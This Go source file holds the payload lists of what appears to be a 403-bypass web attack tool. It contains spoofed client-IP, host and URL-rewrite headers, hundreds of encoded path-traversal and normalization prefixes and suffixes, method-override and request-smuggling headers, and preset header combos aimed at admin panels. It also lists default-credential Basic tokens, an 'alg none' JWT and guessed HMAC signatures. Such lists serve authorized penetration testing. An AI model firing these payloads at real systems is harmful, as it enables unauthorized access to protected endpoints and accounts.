package utils

import (
	"strings"
)

var UserAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
	"Googlebot/2.1 (+http://www.google.com/bot.html)",
	"Mozilla/5.0 (compatible; Bingbot/2.0)",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9",
	"Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Linux; Android 10; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
	"Mozilla/5.0 (compatible; Cloudflare-Traffic-Manager/1.0)",
	"AWS Security Scanner",
}

// 1. IP Headers (Expects IP addresses)
var IPHeaders = []string{
	"X-Forwarded-For",
	"X-Client-IP",
	"X-Real-IP",
	"X-Originating-IP",
	"X-Remote-IP",
	"X-Remote-Addr",
	"Client-IP",
	"True-Client-IP",
	"Cluster-Client-IP",
	"X-ProxyUser-Ip",
	"Real-Ip",
	"X-Forwarded-By",
	"X-Custom-IP-Authorization",
}

// 2. URL/Path Headers (Expects Path or Full URL)
var URLHeaders = []string{
	"X-Original-URL",
	"X-Rewrite-URL",
	"X-Custom-IP-Authorization", // Can accept path sometimes
	"Base-Url",
	"Http-Url",
	"Proxy-Url",
	"Redirect",
	"Request-Uri",
	"Uri",
	"X-Proxy-Url",
	"X-HTTP-DestinationURL",
	"X-Forwarded-Home", // Often path
}

// 3. Host Headers (Expects Hostname/IP)
var HostHeaders = []string{
	"X-Forwarded-Host",
	"X-Host",
	"X-HTTP-Host-Override",
	"Forwarded", // RFC 7239 but often treated as host/for
	"X-Forwarded-Server",
	"Proxy-Host",
}

// 4. Scheme/Proto Headers (Expects http/https)
var SchemeHeaders = []string{
	"X-Forwarded-Scheme",
	"X-Forwarded-Proto",
	"X-Forwarded-Protocol", // Valid variation
	"X-Url-Scheme",
}

// All headers combined for generic fallback/counting if needed (optional)
var BypassHeaders = append(append(append(IPHeaders, URLHeaders...), HostHeaders...), SchemeHeaders...)

var BypassIPs = []string{
	"127.0.0.1",
	"localhost",
	"0.0.0.0",
	"0",
	"127.1",
	"::1",
	"192.168.0.1",
	"10.0.0.1",
	"172.16.0.1",
	"127.0.0.1:80",
	"127.0.0.1:443",
	"127.0.0.1:8080",
}

var HTTPMethods = []string{
	"GET",
	"POST",
	"HEAD",
	"PUT",
	"DELETE",
	"PATCH",
	"TRACE",
	"CONNECT",
}

// HTTPMethodCases - Verb Case Switching for bypass (nomore403 technique)
var HTTPMethodCases = []string{
	"get", "Get", "gEt", "geT", "gET", "GeT", "GEt",
	"post", "Post", "pOst", "poSt", "posT", "POst", "POSt",
	"head", "Head", "hEad", "heAd", "heaD",
	"put", "Put", "pUt", "puT",
	"delete", "Delete", "dElete", "DELETE",
	"patch", "Patch", "PATCH",
	"options", "Options", "OPTIONS",
}

// Path Normalization Bypass Payloads
var PathNormalizationPayloads = []string{
	// Tab/Null Injection
	"%09",      // Tab
	"%00",      // Null byte
	"%00.jpg",  // Null byte with extension
	"%00.html", // Null byte with extension
	"%0d",      // Carriage return
	"%0a",      // Line feed
	"%0d%0a",   // CRLF
	"%0c",      // Form feed

	// Backslash Normalization (Windows-style)
	"\\",
	"\\..\\",
	"\\.\\",
	"..\\",
	".\\",

	// Semicolon Path Parameters (Java/Tomcat)
	";",
	";/",
	";foo=bar",
	";.js",
	";.css",
	";.json",
	";x=1/",
	";/..;/",

	// URL Fragments
	"#",
	"#/",
	"#.json",
	"?#",
	"?",
	"??",
	"?x=1",

	// Overlong UTF-8 Encoding
	"%c0%2e",       // Overlong .
	"%c0%2e%c0%2e", // Overlong ..
	"%c0%af",       // Overlong /
	"%e0%80%af",    // 3-byte overlong /
	"%f0%80%80%af", // 4-byte overlong /

	// Mixed Encoding
	"/%2e%2e/",
	"/%2e./",
	"/.%2e/",
	"/%5c../", // Backslash encoded
	"/%5c..%5c",
}

// Method Override Headers - for bypassing method restrictions
var MethodOverrideHeaders = []string{
	"X-HTTP-Method",
	"X-HTTP-Method-Override",
	"X-Method-Override",
	"X-HTTP-Method-Overwrite",
	"_method",
}

// Method Override Values - methods to try with override headers
var MethodOverrideValues = []string{
	"GET",
	"POST",
	"PUT",
	"DELETE",
	"PATCH",
	"OPTIONS",
	"HEAD",
}

// Host Header Attack Values
var HostHeaderValues = []string{
	"localhost",
	"localhost:80",
	"localhost:443",
	"127.0.0.1",
	"127.0.0.1:80",
	"127.0.0.1:443",
	"0.0.0.0",
	"0.0.0.0:80",
	"[::1]",
	"[::1]:80",
	"127.1",
	"2130706433", // 127.0.0.1 in decimal
}

// Cache Deception Suffixes - for web cache deception attacks
var CacheDeceptionSuffixes = []string{
	"/style.css",
	"/test.js",
	"/logo.png",
	"/image.jpg",
	"/image.gif",
	"/favicon.ico",
	"/.css",
	"/.js",
	"/.png",
	"/.jpg",
	"/.gif",
	"/.ico",
	"/static/x.css",
	"/assets/x.js",
}

// Content-Type Values - for content-type manipulation
var ContentTypeValues = []string{
	"application/json",
	"application/xml",
	"text/plain",
	"text/html",
	"application/x-www-form-urlencoded",
	"multipart/form-data",
	"text/xml",
	"application/javascript",
	"text/css",
}

// Accept Header Values - for accept header manipulation
var AcceptHeaderValues = []string{
	"application/json",
	"application/xml",
	"text/html",
	"text/plain",
	"*/*",
	"application/pdf",
	"image/webp",
	"application/javascript",
	"text/css",
}

var TopPrefixes = []string{
	// Basic slash variations
	"/", "//", "///", "////", "/////", "//////",
	"/./", "//./", "///./", "/././", "//././", "//././/",
	"/../", "//../", "///../", "/..//", "//..//", "///..//", "/../../", "//../..//", "/../../../",
	"/..;/", "//..;/", "/../;/", "/..../",

	// Seclists jhaddix 403 bypass - Semicolon variants
	"/.;/", "/;/", "//;//", "/;x=/",

	// Dot and encoding combinations
	"/%2e/", "//%2e/", "/%2e%2e/", "/%2e%2e%2f/", "/%252e/", "/%252e%252e/", "/%252e%252e%252f/",
	"/%2f/", "//%2f/", "/%2f%2f/", "/%2f%2f%2f/", "/%252f/", "/%252f%252f/",
	"/%2e/", "/%2f/", "/%252f/", "/%252e/", "/%2e%2e;/", "/%2f%2f%2f/", "/%2e%2e%2e/",

	// Whitespace encoding
	"/ /", "/  /", "/%20/", "/%20%20/", "/\t/", "/%09/",

	// Semicolon encoding
	"/.;/", "/;/", "/;;/", "/;;;/", "/%3b/", "/%3b%3b/",

	// Query and fragment
	"/?/", "/#/", "/%3f/", "/%23/", "/%3f%3d/", "//?=/",

	// Special characters
	"/~/", "/_/", "/+/", "/%7e/", "/%2b/", "/%25/", "/%%/", "/%25%25/", "/%%%/",
	"/:/", "/%3a/", "/=/", "/%3d/", "/&/", "/%26/",
	"/...//", "/.../", "/./././", "/.;/", "/.;;/",
	"/  /", "/.  /", "/. /", "//   /",

	// Null and control chars
	"/%00/", "/%0d/", "/%0a/", "/%09/", "/%0c/", "/%0d%0a/", "/%0d%0a%0d%0a/",

	// Mixed encoding
	"/%2e./", "/.%2e/", "/%2f./", "/./.", "/%2f%2e/", "/%2e%2f/", "/%2f%2e%2f/",
	"/%252f%252e/", "/%25%25/", "/%252f%252f/", "/%20%2e/",
	"/;x=/", "/%2f%2f%25/", "/%2e%2e%25/", "/%25%2e/",

	// Backslash and Windows-style
	"/\\.\\.", "/\\?\\", "..;/", "../", "..://", "//..://",
	"/admin\\/\\/", "/..\\..\\/",

	// Complex encoded combinations
	"/%2f%2e%2f%2e%2f/", "/%2f%2e%2e%2e%2f/", "/%25%25%25/",
	"/%2e%2f%2e%2f%2e/", "/%252e%252f%252e/", "/%2f%2f%2e%2e/",
	"/%2e%2e%2f%252f/", "/%3b%3b/", "/%2f%23%23/",
	"/%2f%2e%2e%2f%2e%2e/", "/%252f%252e%252e/", "/%2f%2f%2e%2f/",
	"/%2e%2f%252f/", "/%2f%2f%252f/", "/%2e%2e%2f%252e/",
	"/%25%2e%2e%2f/", "/%2f%25%2f%25/", "/%2f%2e%2f%252f/",
	"/%252f%252e%252f%252f/", "/%2f%2e%2e%2f%252e/",
	"/%2e%2e%2f%2e%2f/", "/%2f%2f%2e%2e%2f/",
	"/%252f%252f%2e%2e/", "/%2f%2f%2f%252e/",
	"/%2e%2f%2e%2e%2f/", "/%252e%252e%252f%252f/",
	"/%2f%2e%2e%2f%2e%2e%2f/", "/%2e%2e%2f%2e%2e%2f%2e/",
	"/%25%2f%2e%2f%25/", "/%2f%3b%3b%3b/", "/%2e%3b%3b/",
	"/%2f%20%20%20/", "/%2e%20%20/",
	"/%252f%252f%252f%252f%252f/", "/%2e%2e%2f%2f%2f%2f/",

	// Seclists jhaddix 403 bypass - Additional patterns
	"/*", "/*/", "/.random/..;/", "/..%3B/",
	"/;%2f..%2f..%2f", "/..%00/", "/..%0d/", "/..%5c/",
	"/%c0%af/", "/%c0%ae/", "/%e0%80%af/", "/%f0%80%80%af/",

	// Double/Triple encoding prefixes
	"/%25%32%66/", "/%25%32%65/", "/%25%35%63/",
	"/%252f%252e%252e/", "/%25252f/", "/%25252e/",

	// Unicode bypass
	"/%u0061dmin/", "/%c0%afadmin/",
	"/%e5%98%8a%e5%98%8d/",
}

var TopSuffixes = []string{
	// Basic suffixes
	"", "/", "//", "///", "////", "/////",
	"/.", "/..", "/...", "/....", "/../", "/..//", "/../../",

	// Seclists jhaddix 403 bypass - Query/Fragment suffixes
	"?", "??", "???", "?/", "/?/", "#", "#/", "#/./",

	// Common file extensions
	".php", ".jsp", ".asp", ".aspx",
	".json", ".xml", ".txt", ".yaml", ".yml",
	".css", ".js", ".html", ".htm",

	// Backup extensions (Seclists jhaddix style)
	".bak", ".backup", ".old", ".inc",
	".php.bak", ".asp.bak", ".aspx.bak",
	".php.old", ".asp.old", ".aspx.old",
	".json.bak", ".txt.bak", ".xml.bak", ".yaml.bak", ".yml.bak",
	".bak.gz", ".backup.gz", ".sql.gz",
	".php~", ".asp~", ".aspx~", ".bak~", ".sql~", ".json~", "~",
	".config", ".conf", ".ini", ".log",
	".config.bak", ".conf.bak", ".ini.bak",
	".htaccess", ".htpasswd", ".htaccess.bak", ".htpasswd.bak",
	".zip", ".tar", ".gz", ".7z", ".rar", ".bz2",
	".tar.gz", ".tar.bz2", ".zip.bak", ".tar.bak", ".gz.bak",
	".7z.bak", ".rar.bak", ".7z.gz", ".rar.gz",
	".sql", ".db", ".sql.bak", ".db.bak",
	".config.old", ".conf.old", ".ini.old",
	".log.bak", ".jsonl.bak",
	".yaml.old", ".yml.old", ".tar.gz.bak",
	".php.backup", ".asp.backup", ".aspx.backup", ".jsp.backup",
	".php.gz", ".asp.gz", ".aspx.gz", ".json.gz", ".xml.gz",
	".yaml.gz", ".yml.gz", ".config.gz", ".conf.gz", ".ini.gz",

	// Seclists jhaddix - URL encoding suffixes
	"/%20", "/%09", "/%0a", "/%0d", "/%00", "/%0c",
	"%20", "%09", "%0a", "%0d", "%00", "%0c",
	"/%0d%0a", ".%0d%0a", "%0d%0a",
	"/%25", ".%25", "%25", "/%25%25", ".%25%25",
	"/%3b", ".%3b", "%3b", "/%3b%3b", ".%3b%3b",
	"/%3f", ".%3f", "%3f", "/%3f%3d", ".%3f%3d",
	"/%23", ".%23", "%23",
	"/%2e%2e;/", ".%2e%2e;/",
	"/%3a", ".%3a", "%3a",
	"/%252e%252e", ".%252e%252e",
	"/%2e./", ".%2e./",
	"/%2f%25", ".%2f%25",
	"/%3d", ".%3d", "%3d",
	"/%26", ".%26", "%26",

	// Seclists jhaddix - Semicolon and special char suffixes
	";", ";;", ";/", "/;",
	"#", "##", "#/",
	"?", "??", "?id=1",
	"..;/", "../", "..://", "//..://",
	"\\.\\..", "\\?\\",
	".html", ".htm",

	// Seclists jhaddix - Additional bypass suffixes
	"/./", "//", "/..", "/..;/",
	"..%3B/", "..%00", ".%00",
	"/°/", "/&", "/-",

	// Null byte tricks
	"%00", "%00.jpg", "%00.html", "%00.json",

	// Parameter manipulation
	"?rand=1", "?x=1", "&",
}

// Request Smuggling & Hop-by-Hop
var SmugglingHeaders = []string{
	"Transfer-Encoding",
	"Content-Length",
	"Connection",
}

var SmugglingValues = []string{
	"chunked",
	"keep-alive",
	"close",
	"TE, CL",
}

// Parameter Pollution & Query Fuzzing
var ParameterPollutionPayloads = []string{
	"?param=../admin",
	"?x=../admin",
	"?id=../admin",
	"?page=../admin",
	"?dir=../admin",
	"?file=../admin",
	"?path=../admin",
	"?f=../admin",
	"?redirect=../admin",
	"?url=../admin",
	"?dest=../admin",
	"?return=../admin",
	"???",
	"&",
	"#",
	"%",
}

// Extension Fuzzing - Extended with jhaddix techniques
var ExtensionPayloads = []string{
	// Common extensions
	".php", ".jsp", ".asp", ".aspx", ".html", ".json",
	".php5", ".php7", ".phtml", ".shtml",
	".bak", ".old", ".save", ".swp",
	"~", ".orig", ".copy", ".tmp",

	// Seclists jhaddix - File extension tricks
	".json", "/.json", ".css", ".html", ".js",
	".inc", ".~", "/~",

	// Case variations (Windows bypass)
	".PHP", ".JSP", ".ASP", ".ASPX", ".HTML", ".JSON",
	".Php", ".Jsp", ".Asp", ".Aspx",
}

// Unicode bypass payloads for path traversal
var UnicodePrefixes = []string{
	"/%c0%af/",
	"/%c0%ae/",
	"/%c0%ae%c0%ae/",
	"/%ef%bc%8f/",
	"/%e2%80%8c/",
	"/%e2%80%8d/",
	"/%c1%9c/",
	"/%c0%2f/",
	"/%e0%80%af/",
	"/%f0%80%80%af/",
	"/%c0%2e/",
	"/%c0%2e%c0%2e/",
	"/%e0%40%ae/",
	"/%c0%5c/",
	"/%c0%ae%c0%5c/",
}

// Double URL encoding payloads
var DoubleEncodedPrefixes = []string{
	"/%252e/",
	"/%252e%252e/",
	"/%252f/",
	"/%252e%252e%252f/",
	"/%25252e/",
	"/%25252e%25252e/",
	"/%255c/",
	"/%252e%255c%252e%252e/",
	"/%2525%32%65/",
	"/%252e%252e%255c/",
}

// GenerateCaseVariations generates case variations of a path
func GenerateCaseVariations(path string) []string {
	if path == "" || path == "/" {
		return []string{path}
	}

	variations := []string{}
	variations = append(variations, path)
	variations = append(variations, strings.ToUpper(path))
	variations = append(variations, strings.ToLower(path))

	if len(path) > 1 {
		variations = append(variations, strings.ToUpper(string(path[0]))+path[1:])
	}

	alt := ""
	for i, c := range path {
		if i%2 == 0 {
			alt += strings.ToUpper(string(c))
		} else {
			alt += strings.ToLower(string(c))
		}
	}
	variations = append(variations, alt)

	return variations
}

// HTTPVersions - HTTP Protocol Version Fuzzing (nomore403 technique)
var HTTPVersions = []string{
	"HTTP/1.0",
	"HTTP/1.1",
	"HTTP/2",
}

// Protocol/Scheme Headers for version/protocol manipulation
var ProtocolHeaders = []string{
	"X-HTTP-Protocol",
	"X-Forwarded-Proto",
	"X-Original-Proto",
	"Front-End-Https",
	"X-Https",
}

// User-Agent Bypass Values (bots, crawlers, internal tools)
var UserAgentBypass = []string{
	"Googlebot/2.1 (+http://www.google.com/bot.html)",
	"Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
	"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
	"DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
	"facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
	"Twitterbot/1.0",
	"LinkedInBot/1.0 (compatible; Mozilla/5.0)",
	"WhatsApp/2.21.4.22",
	"TelegramBot (like TwitterBot)",
	"Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)",
	"internal-tool",
	"admin-scanner",
	"health-check",
	"monitoring-service",
	"curl/7.68.0",
	"wget/1.21",
}

// Referer Bypass Values
var RefererBypass = []string{
	"https://www.google.com/",
	"https://localhost/",
	"https://127.0.0.1/",
	"", // Empty referer
}

// ComboAttacks - Pre-defined header combinations for multi-condition bypasses
// Each combo is a map of headers to send together
type ComboAttack struct {
	Name    string
	Headers map[string]string
}

var ComboAttacks = []ComboAttack{
	// Combo 1: Internal Network Simulation
	{
		Name: "internal-network",
		Headers: map[string]string{
			"X-Forwarded-For":  "127.0.0.1",
			"X-Real-IP":        "127.0.0.1",
			"X-Originating-IP": "127.0.0.1",
			"X-Requested-With": "XMLHttpRequest",
			"Origin":           "http://localhost",
			"Referer":          "http://localhost/admin",
		},
	},
	// Combo 2: Bot + Internal
	{
		Name: "bot-internal",
		Headers: map[string]string{
			"X-Forwarded-For":  "127.0.0.1",
			"User-Agent":       "Googlebot/2.1 (+http://www.google.com/bot.html)",
			"Accept":           "application/json",
			"X-Requested-With": "XMLHttpRequest",
		},
	},
	// Combo 3: API Client Simulation
	{
		Name: "api-client",
		Headers: map[string]string{
			"X-Forwarded-For":  "10.0.0.1",
			"Content-Type":     "application/json",
			"Accept":           "application/json",
			"X-Requested-With": "XMLHttpRequest",
			"Origin":           "http://localhost:3000",
		},
	},
	// Combo 4: Admin Panel Access
	{
		Name: "admin-panel",
		Headers: map[string]string{
			"X-Forwarded-For":  "127.0.0.1",
			"X-Original-URL":   "/admin",
			"Referer":          "http://localhost/admin/login",
			"Origin":           "http://localhost",
			"X-Requested-With": "XMLHttpRequest",
		},
	},
	// Combo 5: Full Bypass Combo
	{
		Name: "full-bypass",
		Headers: map[string]string{
			"X-Forwarded-For":        "127.0.0.1",
			"X-Real-IP":              "127.0.0.1",
			"X-Originating-IP":       "127.0.0.1",
			"X-Remote-IP":            "127.0.0.1",
			"X-Remote-Addr":          "127.0.0.1",
			"X-Client-IP":            "127.0.0.1",
			"Client-IP":              "127.0.0.1",
			"True-Client-IP":         "127.0.0.1",
			"X-Forwarded-Host":       "localhost",
			"X-Original-URL":         "/",
			"X-Rewrite-URL":          "/",
			"User-Agent":             "Googlebot/2.1",
			"Referer":                "http://localhost/admin",
			"Origin":                 "http://localhost",
			"X-Requested-With":       "XMLHttpRequest",
			"Content-Type":           "application/json",
			"Accept":                 "application/json",
			"X-HTTP-Method-Override": "GET",
		},
	},
	// Combo 6: Cloud/CDN Bypass
	{
		Name: "cloud-cdn",
		Headers: map[string]string{
			"X-Forwarded-For":   "127.0.0.1",
			"CF-Connecting-IP":  "127.0.0.1",
			"True-Client-IP":    "127.0.0.1",
			"X-Forwarded-Proto": "https",
			"X-Forwarded-Host":  "localhost",
		},
	},
	// Combo 7: POST with Method Override
	{
		Name: "method-override-post",
		Headers: map[string]string{
			"X-HTTP-Method-Override": "GET",
			"X-Method-Override":      "GET",
			"X-HTTP-Method":          "GET",
			"X-Forwarded-For":        "127.0.0.1",
			"Content-Type":           "application/x-www-form-urlencoded",
		},
	},
}

// Common Auth Tokens for token-based bypass attempts
var CommonAuthTokens = []string{
	"admin",
	"internal",
	"bypass",
	"test",
	"debug",
	"dev",
	"development",
	"staging",
	"root",
	"system",
	"api",
	"secret",
	"token",
	"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9", // JWT header
	"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0",  // JWT none algorithm
	"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0", // Simple admin JWT
	"Bearer admin",
	"Bearer internal",
	"Basic YWRtaW46YWRtaW4=",     // admin:admin
	"Basic YWRtaW46cGFzc3dvcmQ=", // admin:password
	"Basic cm9vdDpyb290",         // root:root
	"Basic dGVzdDp0ZXN0",         // test:test
}

// Common Signatures for HMAC/signature bypass
var CommonSignatures = []string{
	"admin",
	"bypass",
	"test",
	"secret",
	"internal",
	"0000000000000000",
	"ffffffffffffffff",
	"00000000",
	"ffffffff",
	"d033e22ae348aeb5660fc2140aec35850c4da997",                         // SHA1 of "admin"
	"8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918", // SHA256 of "admin"
}

// X-Requested-With values
var XRequestedWithValues = []string{
	"XMLHttpRequest",
	"com.android.browser",
	"fetch",
	"axios",
}
